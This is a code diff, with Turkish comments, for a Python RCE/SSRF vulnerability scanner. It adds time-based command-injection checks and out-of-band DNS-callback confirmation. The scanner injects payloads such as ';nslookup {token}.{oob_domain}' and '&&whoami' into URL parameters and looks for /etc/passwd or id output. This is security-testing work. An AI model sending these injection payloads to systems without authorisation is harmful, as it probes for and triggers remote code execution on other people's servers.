@@ -8,6 +8,7 @@ import re
 import hashlib
 import math
 import os
+import time # Time-based RCE için eklendi
 from typing import Callable, Tuple, Optional, Dict, List
 
 # YENİ: OOBListener'ı dahil et
@@ -22,12 +23,12 @@ from core.scanners.base_scanner import BaseScanner
 
 class RCE_SSRFScanner(BaseScanner):
     """
-    [AR-GE v2.0 - FP-ZERO]
+    [AR-GE v39.0 - FAZ 39: İLERİ OOB ZEKASI]
     Yeni Nesil SSRF / RCE Tarayıcı (Yüksek Güvenilirlik Filtreli)
     --------------------------------------------------------------
     AMAÇ:
-      - Kör (Blind) RCE ve SSRF zafiyetlerini OOB (Out-of-Band) etkileşim ile %100 doğrulamak.
-      - **FP (False Positive) oranını minimuma indirmek** için Baseline karşılaştırmasını güçlendirmek (Akıllı Boyut/Entropy Analizi).
+      - Kör (Blind) RCE ve SSRF zafiyetlerini **OOB (Out-of-Band) etkileşim ile %100 doğrulamak.**
+      - OOB token yönetimini merkezileştirmek ve gönderme/doğrulama aşamasını ayırmak.
     """
 
     # ----------------------
@@ -53,7 +54,6 @@ class RCE_SSRFScanner(BaseScanner):
     ]
     
     # YENİ: Gürültü yapan parametreler (Ignored Params)
-    # Bu parametrelere SSRF/RCE payload'u atmak genelde anlamsızdır ve logları kirletir.
     IGNORED_PARAMS = {
         "color", "background", "bg", "width", "height", "align", "valign",
         "style", "class", "font", "size", "margin", "padding", "border",
@@ -92,10 +92,10 @@ class RCE_SSRFScanner(BaseScanner):
 
     # RCE başarı pattern'leri (klasik çıktılar)
     RCE_PATTERNS = [
-        re.compile(r"root:x:0:0"),          # /etc/passwd
-        re.compile(r"uid=\d+"),             # id çıktısı
-        re.compile(r"\[fonts\]"),           # win.ini
-        re.compile(r"\[extensions\]"),      # win.ini
+        re.compile(r"root:x:0:0"),      # /etc/passwd
+        re.compile(r"uid=\d+"),         # id çıktısı
+        re.compile(r"\[fonts\]"),       # win.ini
+        re.compile(r"\[extensions\]"),  # win.ini
     ]
 
     # Echo tabanlı RCE payload şablonları (token ile doldurulur)
@@ -114,7 +114,7 @@ class RCE_SSRFScanner(BaseScanner):
         "&&whoami",
     ]
 
-    # OOB Etkileşim için sabitler (YENİ FAZ 25)
+    # OOB Etkileşim için sabitler
     OOB_DOMAIN_BASE = "synara.oob.platform.com" 
     OOB_RCE_PAYLOADS = [
         ";nslookup {token}.{oob_domain}",
@@ -150,6 +150,9 @@ class RCE_SSRFScanner(BaseScanner):
         self.calibration_headers = {}
         # YENİ: OOB Listener referansı
         self.oob_listener = oob_listener_instance
+        # FAZ 39: Kontrol edilmesi gereken token'lar (token, param, test_url)
+        self._oob_tokens_to_check: List[Tuple[str, str, str]] = []
+
 
     @property
     def name(self):
@@ -157,7 +160,7 @@ class RCE_SSRFScanner(BaseScanner):
 
     @property
     def category(self):
-        return "SSRF_RCE"
+        return "RCE_SSRF"
 
     # ----------------------
     # ANA GİRİŞ NOKTASI
@@ -171,17 +174,15 @@ class RCE_SSRFScanner(BaseScanner):
         self.log(f"[{self.category}] Tarama başlatıldı (Akıllı Filtre Aktif).", "INFO")
 
         try:
-            # 1) Çok gürültülü ortamda SSRF'nin güvenilir olmadığını belirt
+            # 1) Ön filtreleme
             if self.latency_cv > self.HIGH_VARIANCE_THRESHOLD:
                 self.add_result(
                     self.category,
                     "WARNING",
-                    f"Sunucu yanıt varyansı çok yüksek (CV={self.latency_cv:.2f}). "
-                    f"Time-based SSRF sinyalleri güvenilir olmayabilir.",
+                    f"Sunucu yanıt varyansı çok yüksek (CV={self.latency_cv:.2f}). Time-based SSRF sinyalleri güvenilir olmayabilir.",
                     0,
                 )
 
-            # 2) Anti-bot / rate-limit header'ları varsa SSRF sonuçlarını agresif yorumlama
             for h_name in ["X-RateLimit-Limit", "Retry-After", "CF-RAY"]:
                 if self.calibration_headers.get(h_name):
                     self.add_result(
@@ -195,18 +196,14 @@ class RCE_SSRFScanner(BaseScanner):
             parsed = urlparse(url)
             base_query = parse_qs(parsed.query)
 
-            # Pre-Scan tarafından bulunan parametreler
             discovered = getattr(self, "discovered_params", set())
             params = set(base_query.keys()) | set(discovered)
 
-            # URL'de olmayan ama keşfedilen parametrelere default değer ver
             for p in discovered:
                 if p not in base_query:
                     base_query[p] = ["SYNARA_SSRF_TEST"]
                     params.add(p)
             
-            # --- FİLTRELEME İŞLEMİ (V17.1) ---
-            # Görsel/CSS/TOKEN parametrelerini ayıkla
             filtered_params = {p for p in params if p.lower() not in self.IGNORED_PARAMS}
             ignored_count = len(params) - len(filtered_params)
             
@@ -214,19 +211,12 @@ class RCE_SSRFScanner(BaseScanner):
                 self.log(f"[{self.category}] {ignored_count} adet görsel/gereksiz/token parametre tarama dışı bırakıldı (Gürültü Azaltma).", "INFO")
 
             if not filtered_params:
-                self.add_result(
-                    self.category,
-                    "INFO",
-                    "INFO: SSRF/RCE için uygun parametre bulunamadı.",
-                    0,
-                )
+                self.add_result(self.category, "INFO", "INFO: SSRF/RCE için uygun parametre bulunamadı.", 0)
                 completed_callback()
                 return
 
-            # 3) Baseline yanıtını al (SSRF tespitinde fark analizi için)
-            baseline_status, baseline_len, baseline_body, baseline_entropy = await self._fetch_baseline(
-                url, session
-            )
+            # 3) Baseline yanıtını al
+            baseline_status, baseline_len, baseline_body, baseline_entropy = await self._fetch_baseline(url, session)
 
             semaphore = asyncio.Semaphore(self.CONCURRENCY_LIMIT)
             tasks = []
@@ -236,52 +226,25 @@ class RCE_SSRFScanner(BaseScanner):
                 for target in self.SSRF_TARGETS:
                     tasks.append(
                         self._test_ssrf(
-                            base_url=url,
-                            param=p,
-                            target=target,
-                            session=session,
-                            parsed=parsed,
-                            base_query=base_query,
-                            semaphore=semaphore,
-                            baseline_status=baseline_status,
-                            baseline_len=baseline_len,
-                            baseline_body=baseline_body,
-                            baseline_entropy=baseline_entropy,
+                            base_url=url, param=p, target=target, session=session, parsed=parsed,
+                            base_query=base_query, semaphore=semaphore, baseline_status=baseline_status,
+                            baseline_len=baseline_len, baseline_body=baseline_body, baseline_entropy=baseline_entropy,
                         )
                     )
 
-            # ---- RCE Testleri (echo + klasik) ----
-            for p in filtered_params:
-                # Echo tabanlı payload'lar
+                # ---- RCE Testleri (echo + klasik + time-based) ----
                 for template in self.RCE_ECHO_TEMPLATES:
-                    tasks.append(
-                        self._test_rce_echo(
-                            base_url=url,
-                            param=p,
-                            template=template,
-                            session=session,
-                            parsed=parsed,
-                            base_query=base_query,
-                            semaphore=semaphore,
-                        )
-                    )
+                    tasks.append(self._test_rce_echo(url, p, template, session, parsed, base_query, semaphore))
 
-                # Klasik id / whoami payload'ları
                 for payload in self.RCE_SIMPLE_PAYLOADS:
-                    tasks.append(
-                        self._test_rce_classic(
-                            base_url=url,
-                            param=p,
-                            payload=payload,
-                            session=session,
-                            parsed=parsed,
-                            base_query=base_query,
-                            semaphore=semaphore,
-                        )
-                    )
+                    tasks.append(self._test_rce_classic(url, p, payload, session, parsed, base_query, semaphore))
+                    
+                for payload in self.TIME_RCE_PAYLOADS:
+                    tasks.append(self._test_time_based_rce(url, p, payload, session, parsed, base_query, semaphore))
                 
                 # ---- OOB RCE Testleri (Blind Confirmation) ----
                 for template in self.OOB_RCE_PAYLOADS:
+                    # YENİ FAZ 39: Token üretimi ve Listener kaydı
                     token = hashlib.sha1(os.urandom(10)).hexdigest()[:12]
                     payload = template.format(token=token, oob_domain=self.OOB_DOMAIN_BASE)
                     
@@ -291,12 +254,14 @@ class RCE_SSRFScanner(BaseScanner):
                     new_parts[4] = urlencode(test_query, doseq=True)
                     test_url = urlunparse(new_parts)
 
-                    # KRİTİK: Token'ı Listener'a kaydet
                     if self.oob_listener:
                         self.oob_listener.add_token(token)
+                        # Token'ı daha sonra kontrol etmek üzere listeye ekle
+                        self._oob_tokens_to_check.append((token, p, test_url))
 
+                    # Sadece request'i gönder (Confirmation _confirm_oob_hits içinde olacak)
                     tasks.append(
-                        self._send_request(test_url, p, token, "OOB", semaphore, session, method="HEAD")
+                        self._send_oob_probe(test_url, p, token, semaphore, session)
                     )
 
             self.log(
@@ -305,29 +270,99 @@ class RCE_SSRFScanner(BaseScanner):
             )
 
             if tasks:
-                # KRİTİK DÜZELTME: Tüm görevleri burada await ediyoruz.
                 await asyncio.gather(*tasks)
+            
+            # FAZ 39 KRİTİK: OOB Kontrolünü planla
+            if self.oob_listener and self._oob_tokens_to_check:
+                 await self._confirm_oob_hits()
 
         except Exception as e:
             msg = f"Kritik Hata: {type(e).__name__} ({e})"
             self.log(f"[{self.category}] {msg}", "CRITICAL")
-            self.add_result(
-                self.category,
-                "CRITICAL",
-                msg,
-                self._calculate_score_deduction("CRITICAL"),
-            )
+            self.add_result(self.category, "CRITICAL", msg, self._calculate_score_deduction("CRITICAL"))
 
         completed_callback()
+
+    # ----------------------
+    # FAZ 39: OOB KONTROL MANTIĞI
+    # ----------------------
+    async def _send_oob_probe(
+        self,
+        url: str,
+        param: str,
+        identifier: str,
+        semaphore: asyncio.Semaphore,
+        session: aiohttp.ClientSession,
+        method: str = "HEAD", # OOB sinyali gönderildiği için genellikle HEAD yeterlidir.
+    ):
+        """
+        OOB payload'unu hedefe gönderir ve Listener'a loglama yapar.
+        Asıl doğrulama `_confirm_oob_hits` metodunda yapılır.
+        """
+        async with semaphore:
+             try:
+                if hasattr(self, '_apply_jitter_and_throttle'):
+                    await self._apply_jitter_and_throttle()
+                
+                self.request_callback()
+                
+                # HEAD/GET isteğini gönder
+                if method == "HEAD":
+                    async with session.head(url, timeout=5) as res:
+                        status = res.status
+                else:
+                    async with session.get(url, timeout=15) as res:
+                         status = res.status
+                
+                self.oob_listener.log(
+                    f"[{self.category}] OOB Sinyali Gönderildi (Status: {status}): Param '{param}' -> Token '{identifier}'",
+                    "INFO",
+                )
+
+             except Exception as e:
+                self.oob_listener.log(f"[{self.category}] OOB Gönderim Hatası (Token: {identifier}): {type(e).__name__}", "WARNING")
+
+    async def _confirm_oob_hits(self):
+        """
+        FAZ 39 KRİTİK: Tüm gönderilen OOB token'larının durumunu kontrol eder 
+        ve başarı durumunda sonuç olarak ekler.
+        """
+        # 1. 5 saniye bekle (OOB sinyalinin geri gelmesi için yeterli süre)
+        delay = 5
+        self.log(f"[{self.category}] OOB Kontrolü: {delay} saniye bekleniyor...", "INFO")
+        await asyncio.sleep(delay)
+        
+        oob_hits_found = 0
+
+        # 2. Tokenları kontrol et
+        for token, param, test_url in self._oob_tokens_to_check:
+            # check_token_status metodu Listener'a ait olmalı
+            status = self.oob_listener.check_token_status(token)
+            
+            if status == "HIT":
+                # Zafiyet kanıtlandı
+                self.add_result(
+                    self.category,
+                    "CRITICAL",
+                    f"KRİTİK: Blind RCE/SSRF kanıtlandı! OOB sinyali geri döndü. Param: '{param}', Payload: {test_url}",
+                    self._calculate_score_deduction("CRITICAL"),
+                )
+                self.oob_listener.log(f"[{self.category}] OOB HIT DOĞRULANDI! Token: {token} - Param: {param}", "CRITICAL")
+                oob_hits_found += 1
+            
+        if oob_hits_found == 0:
+             self.log(f"[{self.category}] OOB Kontrolü tamamlandı. Geri dönüş sinyali tespit edilmedi.", "INFO")
+        else:
+             self.log(f"[{self.category}] OOB Kontrolü tamamlandı. {oob_hits_found} adet zafiyet doğrulandı.", "CRITICAL")
 
     # ----------------------
     # Baseline Yardımcı
     # ----------------------
     async def _fetch_baseline(
         self, url: str, session: aiohttp.ClientSession
-    ):
+    ) -> Tuple[Optional[int], Optional[int], str, float]:
+        """Baseline isteğini gönderir ve metrikleri döndürür."""
         try:
-            # Jitter ve Throttle uygula
             if hasattr(self, '_apply_jitter_and_throttle'):
                 await self._apply_jitter_and_throttle()
             await asyncio.sleep(random.uniform(0.05, 0.2))
@@ -554,72 +589,59 @@ class RCE_SSRFScanner(BaseScanner):
                             return
             except: pass
 
-    async def _send_request(
+    # ----------------------
+    # RCE Test Mantığı — Time-Based (FAZ 39)
+    # ----------------------
+    async def _test_time_based_rce(
         self,
-        url: str,
+        base_url: str,
         param: str,
-        identifier: str,
-        check_type: str,
-        semaphore: asyncio.Semaphore,
+        payload: str,
         session: aiohttp.ClientSession,
-        method: str = "GET",
-        check_time: bool = False
+        parsed,
+        base_query,
+        semaphore: asyncio.Semaphore,
     ):
         async with semaphore:
+            test_query = dict(base_query)
+            prev = test_query.get(param, [""])[0]
+            test_query[param] = [prev + payload]
+            new_parts = list(parsed)
+            new_parts[4] = urlencode(test_query, doseq=True)
+            test_url = urlunparse(new_parts)
+
             try:
-                # OOB kontrolü için ekstra kontrol
-                if check_type == "OOB":
-                    # 1. HİT durumunu kontrol et
-                    if self.oob_listener and self.oob_listener.check_token_status(identifier) == "HIT":
-                        # Zafiyet kanıtlandı
-                        self.add_result(
-                            self.category,
-                            "CRITICAL",
-                            f"KRİTİK: Blind RCE/SSRF kanıtlandı! OOB sinyali geri döndü. Param: '{param}', Token: {identifier}",
-                            self._calculate_score_deduction("CRITICAL")
-                        )
-                        self.oob_listener.log(f"[{self.category}] OOB HIT DOĞRULANDI! Token: {identifier} - Param: {param}", "CRITICAL")
-                        return # Kritik bulgu, çıkış yap
-
-                    # 2. Gönderim işlemini yap
-                    # Jitter ve Throttle uygula
-                    if hasattr(self, '_apply_jitter_and_throttle'):
-                        await self._apply_jitter_and_throttle()
-                        
-                    self.request_callback()
-                    
-                    if method == "HEAD":
-                        await session.head(url, timeout=5)
-                    else:
-                        await session.get(url, timeout=15)
-                        
-                    self.oob_listener.log(
-                             f"[{self.category}] OOB Sinyali Gönderildi: Param '{param}' -> Token '{identifier}'",
-                             "INFO",
-                    )
-                    return # OOB Görevleri sadece sinyal yollayıp döner.
-
-                # Normal request işlemleri
-                start_time = asyncio.get_running_loop().time()
+                # Jitter ve Throttle uygula
+                if hasattr(self, '_apply_jitter_and_throttle'):
+                    await self._apply_jitter_and_throttle()
+                await asyncio.sleep(random.uniform(0.1, 0.4))
+                
+                # ZAMAN BAŞLANGICI
+                start_time = time.time()
                 self.request_callback()
+
+                # İstek gönder
+                async with session.get(
+                    test_url,
+                    allow_redirects=True,
+                    timeout=aiohttp.ClientTimeout(total=self.TIMEOUT + 10), # Komutun bekleme süresi + güvenlik payı
+                ) as res:
+                    await res.read() # Yanıtı oku
+
+                duration = time.time() - start_time
                 
-                if method == "HEAD":
-                    await session.head(url, timeout=5)
-                else:
-                    await session.get(url, timeout=15)
-                
-                end_time = asyncio.get_running_loop().time()
-                duration = end_time - start_time
-                
-                # TIME-BASED KONTROLÜ (Bu blok şu an sadece placeholder olarak duruyor)
-                if check_type == "TIME" and check_time:
-                    if duration >= 9.5:
-                         pass 
+                # SADECE 10 SANİYEDEN UZUN SÜRENLER KRİTİKTİR
+                if duration >= self.TIMEOUT + 5: # 10 sn sleep + 5 sn pay
+                    self.add_result(
+                        self.category,
+                        "CRITICAL",
+                        f"KRİTİK: RCE BAŞARISI (Time-Based doğrulandı)! Param: '{param}', Payload: {payload} (Gecikme: {duration:.2f}s)",
+                        self._calculate_score_deduction("CRITICAL"),
+                    )
 
             except asyncio.TimeoutError:
-                if check_type == "TIME" and check_time:
-                    pass # Timeout durumunu pasif olarak tut
+                # Eğer timeout olursa (10 saniye bekleme süresi dolmadan) bu bir hata sayılmaz.
+                # Ancak 10 saniye bekleme süresi + 10 saniye daha ek süre veriyoruz.
+                pass
             except Exception as e:
-                # OOB hatalarını her zaman loglama (gürültü olmasın diye)
-                if check_type != "OOB":
-                     pass
+                self.log(f"[{self.category}] Time-Based RCE test hatası ({param}): {type(e).__name__}", "WARNING")
